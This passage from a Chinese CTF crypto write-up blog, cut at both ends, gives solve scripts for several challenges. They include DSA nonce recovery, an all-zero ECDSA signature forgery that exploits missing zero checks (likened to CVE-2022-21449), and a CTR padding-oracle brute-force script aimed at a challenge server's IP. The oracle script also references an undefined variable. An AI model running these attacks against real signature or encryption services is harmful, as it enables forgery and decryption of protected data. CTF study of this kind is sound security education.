class="number">161310487790785086482919800040790794252181955976860261806376528825054571226885460699399582301663712128659872558133023114896223014064381772944582265101778076462675402208451386747128794418362648706087358197370036248544508513485401475977401111270352593919906650855268709958151310928767086591887892397722958234379</span></span><br><span class="line">q= <span class="number">1115861146902610160756777713087325311747309309771</span></span><br><span class="line">g= <span class="number">61073566757714587321114447684333928353300944355112378054603585955730395524359123615359185275743626350773632555967063692889668342544616165017003197599818881844811647270423070958521148291118914198811187731689123176313367399492561288350530256722898205674043032421874788802819858438796795768177550638273020791962</span></span><br><span class="line">y= <span class="number">23678147495254433946472657196764372220306841739888385605070426528738230369489739339976134564575544246606937803367113623097260181789372915552172469427842482448570540429192377881186772226796452797182435452490307834205012154495575570994963829345053331967442452842152258650027916313982835119514473311305158299360</span></span><br><span class="line">(h1, r1, s1) = <span class="number">535874494834828755542711401117152397489711233142</span>, <span class="number">117859946800380767356190121030392492081340616512</span>, <span class="number">26966646740134065096660259687229179143947213779</span></span><br><span class="line">(h2, r2, s2) = <span class="number">236574518096866758760287021848258048065293279716</span>, <span class="number">863199000523521111517835459866422731857447792677</span>, <span class="number">517924607931342012033031470185302567344725962419</span></span><br><span class="line"></span><br><span class="line">b = <span class="number">17474742587088593627</span></span><br><span class="line"></span><br><span class="line">k = (h1*r2-h2*r1 + b*s2*r1)*inverse(s1*r2-a*s2*r1,q) % q</span><br><span class="line">x = (k*s1 - h1)*inverse(r1,q) % q</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(x))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0x03-Or1cle"><a href="#0x03-Or1cle" class="headerlink" title="0x03. Or1cle"></a>0x03. Or1cle</h1><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202402012336494.png" alt="image-20240201233635373"></p><p>目的是拿到xenny的签名。一同操作后发现hex报错能弹源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> get_signature</span><br><span class="line"><span class="number">2.</span> get_flag</span><br><span class="line"><span class="number">3.</span> gift</span><br><span class="line"><span class="number">4.</span> exit</span><br><span class="line"><span class="number">2</span></span><br><span class="line">sign: the</span><br><span class="line">An error occurred <span class="keyword">in</span> /app/task.py at line <span class="number">33</span> <span class="keyword">in</span> verify: invalid literal <span class="keyword">for</span> <span class="built_in">int</span>() <span class="keyword">with</span> base <span class="number">16</span>: <span class="string">b&#x27;the&#x27;</span></span><br><span class="line"><span class="number">23</span>: self.P = self.d*secp256k1.G</span><br><span class="line"><span class="number">24</span>:</span><br><span class="line"><span class="number">25</span>: <span class="keyword">def</span> <span class="title function_">signature</span>(<span class="params">self,msg</span>):</span><br><span class="line"><span class="number">26</span>: h = <span class="built_in">int</span>(hashlib.sha256(msg).hexdigest(),<span class="number">16</span>)</span><br><span class="line"><span class="number">27</span>: k = h^self.d</span><br><span class="line"><span class="number">28</span>: r = (k*secp256k1.G).x</span><br><span class="line"><span class="number">29</span>: s = inverse(k,secp256k1.q) * (h + r*self.d) % secp256k1.q</span><br><span class="line"><span class="number">30</span>: <span class="keyword">return</span> <span class="string">&#x27;%064x%064x&#x27;</span> % (r, s)</span><br><span class="line"><span class="number">31</span>:</span><br><span class="line"><span class="number">32</span>: <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self,z, signature</span>):</span><br><span class="line"><span class="number">33</span>: r, s = <span class="built_in">int</span>(signature[:<span class="number">64</span>], <span class="number">16</span>), <span class="built_in">int</span>(signature[<span class="number">64</span>:], <span class="number">16</span>)</span><br><span class="line"><span class="number">34</span>: z = <span class="built_in">int</span>(hashlib.sha256(z).hexdigest(), <span class="number">16</span>)</span><br><span class="line"><span class="number">35</span>: s_inv = <span class="built_in">pow</span>(s, secp256k1.q - <span class="number">2</span>, secp256k1.q)</span><br><span class="line"><span class="number">36</span>: u1 = (z * s_inv) % secp256k1.q</span><br><span class="line"><span class="number">37</span>: u2 = (r * s_inv) % secp256k1.q</span><br><span class="line"><span class="number">38</span>: point = u1 * secp256k1.G + u2 * self.P</span><br><span class="line"><span class="number">39</span>: <span class="keyword">return</span> point.x == r</span><br><span class="line"><span class="number">40</span>:</span><br><span class="line"><span class="number">41</span>: banner = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">42: _  __                                       __________        ___________</span></span><br><span class="line"><span class="string">43: | |/_/__ ___  ___  __ __    __              /\____;;___\      |          |</span></span><br><span class="line"><span class="string">sth error</span></span><br></pre></td></tr></table></figure><p>观察到r s没加非0校验，和CVE-2022-21449一样，非预期直接秒</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202402012338963.png" alt="[FR$~ZD]A3TJP23Q$5CP$UO"></p><blockquote><p>做出这道真不是纯运气，要不是之前辛苦复现，不然这道题拿不下来。</p></blockquote><h1 id="0x04-Or2cle"><a href="#0x04-Or2cle" class="headerlink" title="0x04. Or2cle"></a>0x04. Or2cle</h1> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> Counter</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">FLAG = <span class="string">b&#x27;fake_flag&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Proof</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">S</span>(<span class="params">self,n</span>):</span><br><span class="line">        factors = <span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">while</span> n % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            factors.add(<span class="number">2</span>)</span><br><span class="line">            n //= <span class="number">2</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="built_in">int</span>(n**<span class="number">0.5</span>) + <span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">            <span class="keyword">while</span> n % i == <span class="number">0</span>:</span><br><span class="line">                factors.add(i)</span><br><span class="line">                n //= i</span><br><span class="line">        <span class="keyword">if</span> n &gt; <span class="number">2</span>:</span><br><span class="line">            factors.add(n)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> factors</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Y</span>(<span class="params">self,n</span>):</span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        result = n</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> self.S(n):</span><br><span class="line">            result *= (<span class="number">1</span> - <span class="number">1</span> / p)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">proof</span>(<span class="params">self,n</span>):</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, m+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, l+<span class="number">1</span>):</span><br><span class="line">                    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, k+<span class="number">1</span>):</span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, j+<span class="number">1</span>):</span><br><span class="line">                            <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, i+<span class="number">1</span>):</span><br><span class="line">                                <span class="keyword">for</span> g <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, h+<span class="number">1</span>):</span><br><span class="line">                                    <span class="keyword">for</span> f <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, g+<span class="number">1</span>):</span><br><span class="line">                                        <span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, f+<span class="number">1</span>):</span><br><span class="line">                                            <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e+<span class="number">1</span>):</span><br><span class="line">                                                <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, d+<span class="number">1</span>):</span><br><span class="line">                                                    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, c+<span class="number">1</span>):</span><br><span class="line">                                                        <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, b+<span class="number">1</span>):</span><br><span class="line">                                                            res +=  b//a*(self.Y(a)) <span class="comment"># Euler function </span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Harukii_Oracle</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,key</span>):</span><br><span class="line">        self.k  = key</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">self, plaintext</span>):</span><br><span class="line">        block_size = randint(<span class="number">1</span>,<span class="built_in">len</span>(plaintext)-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(plaintext) &lt;  block_size :</span><br><span class="line">            <span class="keyword">return</span> plaintext</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            padding_length = <span class="built_in">len</span>(plaintext) // <span class="number">16</span></span><br><span class="line">            padding_byets = <span class="built_in">bytes</span>([padding_length])</span><br><span class="line">            plaintext = plaintext.replace(padding_byets,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">            p = plaintext[:<span class="number">16</span>]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span> , padding_length+<span class="number">1</span>):</span><br><span class="line">                p += padding_byets + plaintext[<span class="number">16</span>*i:<span class="number">16</span>*(i+<span class="number">1</span>)]</span><br><span class="line">            <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self,plaintext</span>):</span><br><span class="line">        aes = AES.new(self.k,mode=AES.MODE_CTR,counter=Counter.new(<span class="number">128</span>))</span><br><span class="line">        chipertext = aes.encrypt(self.pad(plaintext))</span><br><span class="line">        <span class="keyword">return</span> chipertext</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gift</span>(<span class="params">self,ciphertext</span>):</span><br><span class="line">        aes = AES.new(self.k,mode=AES.MODE_CTR,counter=Counter.new(<span class="number">128</span>))</span><br><span class="line">        plaintext = aes.decrypt(ciphertext)</span><br><span class="line">        padding_length = <span class="built_in">len</span>(plaintext) // <span class="number">16</span></span><br><span class="line">        padding_bytes = <span class="built_in">bytes</span>([padding_length])</span><br><span class="line">        <span class="keyword">return</span> plaintext.count(padding_bytes) == padding_length</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">Menu = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">1. get flag</span></span><br><span class="line"><span class="string">2. gift</span></span><br><span class="line"><span class="string">3. exit</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">task</span>(<span class="params">client_socket</span>):</span><br><span class="line">    client_socket.settimeout(<span class="number">3600</span>)</span><br><span class="line">    s = <span class="built_in">str</span>((getPrime(<span class="number">128</span>)))</span><br><span class="line">    client_socket.send(<span class="string">f&quot;s : <span class="subst">&#123;s&#125;</span>\n&quot;</span>.encode())</span><br><span class="line">    client_socket.send(<span class="string">&quot;Give me a hash: &quot;</span>.encode())</span><br><span class="line">    <span class="built_in">hash</span> = client_socket.recv(<span class="number">1024</span>)[:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">hash</span> = <span class="built_in">int</span>(<span class="built_in">hash</span>,<span class="number">16</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;if hash != int(sha256(str(Proof.proof(s)).encode()).hexdigest(),16):</span></span><br><span class="line"><span class="string">        client_socket.send(&quot;: C&quot;.encode())</span></span><br><span class="line"><span class="string">        exit(-1)&#x27;&#x27;&#x27;</span></span><br><span class="line">    key = randbytes(<span class="number">16</span>)</span><br><span class="line">    YSGS = Harukii_Oracle(key=key)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            client_socket.send(Menu.encode())</span><br><span class="line">            choice = client_socket.recv(<span class="number">1024</span>).decode().strip()</span><br><span class="line">            <span class="keyword">if</span> choice == <span class="string">&#x27;1&#x27;</span> :</span><br><span class="line">                enc_flag = base64.b64encode(YSGS.encrypt(FLAG))</span><br><span class="line">                client_socket.send(<span class="string">f&quot;This is Your flag <span class="subst">&#123;enc_flag&#125;</span>&quot;</span>.encode())</span><br><span class="line">            <span class="keyword">elif</span> choice == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">                c = client_socket.recv(<span class="number">1024</span>)[:-<span class="number">1</span>]</span><br><span class="line">                <span class="keyword">if</span> YSGS.gift(c):</span><br><span class="line">                    client_socket.send(<span class="string">&quot;Dec successfully&quot;</span>.encode())</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    client_socket.send(<span class="string">&quot;Dec faild&quot;</span>.encode())</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                exit(-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    server.bind((<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">9999</span>))</span><br><span class="line">    server.listen(<span class="number">100</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            client_sock, address = server.accept()</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Accepted connection from <span class="subst">&#123;address[<span class="number">0</span>]&#125;</span>:<span class="subst">&#123;address[<span class="number">1</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            client_handler = threading.Thread(target=task, args=(client_sock,))</span><br><span class="line">            client_handler.start()</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        server.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x04-1-简化proof函数"><a href="#0x04-1-简化proof函数" class="headerlink" title="0x04.1 简化proof函数"></a>0x04.1 简化proof函数</h2><p>拿到前几个序列的数不知道咋搞，上谷歌搜，居然在杨辉三角里找到了对应的数，勾起极大的兴趣，于是 <code>pip install pascal</code> 跑测试。其结果也很简单，就是 <code>binomial(s+13,14)</code>。</p><p>赛后知道可以用 <a href="https://oeis.org/">https://oeis.org/</a> 查数列，厉害厉害。</p><h2 id="0x04-2-CTR-Oracle"><a href="#0x04-2-CTR-Oracle" class="headerlink" title="0x04.2 CTR Oracle"></a>0x04.2 CTR Oracle</h2><p>CTR模式中，AES加密的是Counter，然后把加密得到的Counter与明文异或得到密文。因此，我们对输入1得到的flag密文，改变其中任意一个不是padding位置的字节，在AES解密后得到的明文中，就也只有这一个位置的字节被改变了。</p><p>而我们对这一个被改变的字节，遍历256种可能取值，当且仅当解密后的明文恰为padding字节的值时，靶机会返回给我们failed，因为这个时候padding字节多出来一个。我们将这时候的这个字节值记为<strong>t</strong>。</p><p>而padding字节的值是多少，这个我们是知道的，因为我们从输入1返回的密文中，可以知道flag的长度是42，也就自然知道了有几个分组。我们把它记为<strong>r</strong>。而CTR模式又有一个很重要的性质，也就是同一分组的明文异或等于密文异或，因此对于当前这个字节，其本身的加密值是enc的话，我们就可以由：<br>$$<br>m&#x3D;enc \oplus t\oplus r<br>$$<br>求出当前这个字节的明文值。因此我们就可以逐字符爆破，并求出flag的全部内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> sage.functions.other <span class="keyword">import</span> binomial </span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rec = remote(<span class="string">&quot;1.14.108.193&quot;</span>, <span class="built_in">int</span>(<span class="number">31310</span>)) </span><br><span class="line">r = rec.recvuntil(<span class="string">b&#x27;Give me a hash&#x27;</span>) </span><br><span class="line"><span class="built_in">print</span>(r) </span><br><span class="line">s = <span class="built_in">int</span>(r.split(<span class="string">b&#x27;\n&#x27;</span>)[<span class="number">0</span>][<span class="number">4</span>:].decode(),<span class="number">10</span>) </span><br><span class="line"><span class="built_in">print</span>(s) </span><br><span class="line">hs = <span class="built_in">str</span>(sha256(<span class="built_in">str</span>(binomial(s+<span class="number">13</span>,<span class="number">14</span>)).encode()).hexdigest()).encode() </span><br><span class="line"><span class="built_in">print</span>(hs)</span><br><span class="line">rec.sendline(hs) </span><br><span class="line">rec.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">rec.recvuntil(<span class="string">b&quot;This is Your flag &quot;</span>)</span><br><span class="line">enc_flag = b64decode(sh.recvline().strip().decode()[<span class="number">2</span>:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="number">0</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>,<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> trange(<span class="number">256</span>):</span><br><span class="line">            rec.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">            msg = enc_flag[:i] + long_to_bytes(j) + enc_flag[i+<span class="number">1</span>:]</span><br><span class="line">            rec.sendline(msg)</span><br><span class="line">            rec.recvuntil(<span class="string">b&quot;Dec &quot;</span>)</span><br><span class="line">            temp = rec.recvline()</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">b&quot;fail&quot;</span> <span class="keyword">in</span> temp):</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">chr</span>(j ^ enc_flag[i] ^ <span class="number">2</span>))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#group2</span></span><br><span class="line"><span class="keyword">if</span>(<span class="number">0</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>,<span class="number">33</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> trange(<span class="number">256</span>):</span><br><span class="line">            rec.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">            msg = enc_flag[:i] + long_to_bytes(j) + enc_flag[i+<span class="number">1</span>:]</span><br><span class="line">            rec.sendline(msg)</span><br><span class="line">            rec.recvuntil(<span class="string">b&quot;Dec &quot;</span>)</span><br><span class="line">            temp = rec.recvline()</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">b&quot;fail&quot;</span> <span class="keyword">in</span> temp):</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">chr</span>(j ^ enc_flag[i] ^ <span class="number">2</span>))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#group3</span></span><br><span class="line"><span class="keyword">if</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">41</span>,<span class="number">43</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> trange(<span class="number">256</span>):</span><br><span class="line">            rec.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">            msg = enc_flag[:i] + long_to_bytes(j) + enc_flag[i+<span class="number">1</span>:]</span><br><span class="line">            rec.sendline(msg)</span><br><span class="line">            rec.recvuntil(<span class="string">b&quot;Dec &quot;</span>)</span><br><span class="line">            temp = rec.recvline()</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">b&quot;fail&quot;</span> <span class="keyword">in</span> temp):</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">chr</span>(j ^ enc_flag[i] ^ <span class="number">2</span>))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">rec.close()</span><br></pre></td></tr></table></figure><h1 id="0x05-babySPN"><a href="#0x05-babySPN" class="headerlink" title="0x05. babySPN"></a>0x05. babySPN</h1><p>类DES加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bin_to_list</span>(<span class="params">r, bit_len</span>):</span><br><span class="line">    <span class="built_in">list</span> = [r &gt;&gt; d &amp; <span class="number">1</span> <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(bit_len)][::-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_to_int</span>(<span class="params"><span class="built_in">list</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Pbox=[<span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">14</span>, <span 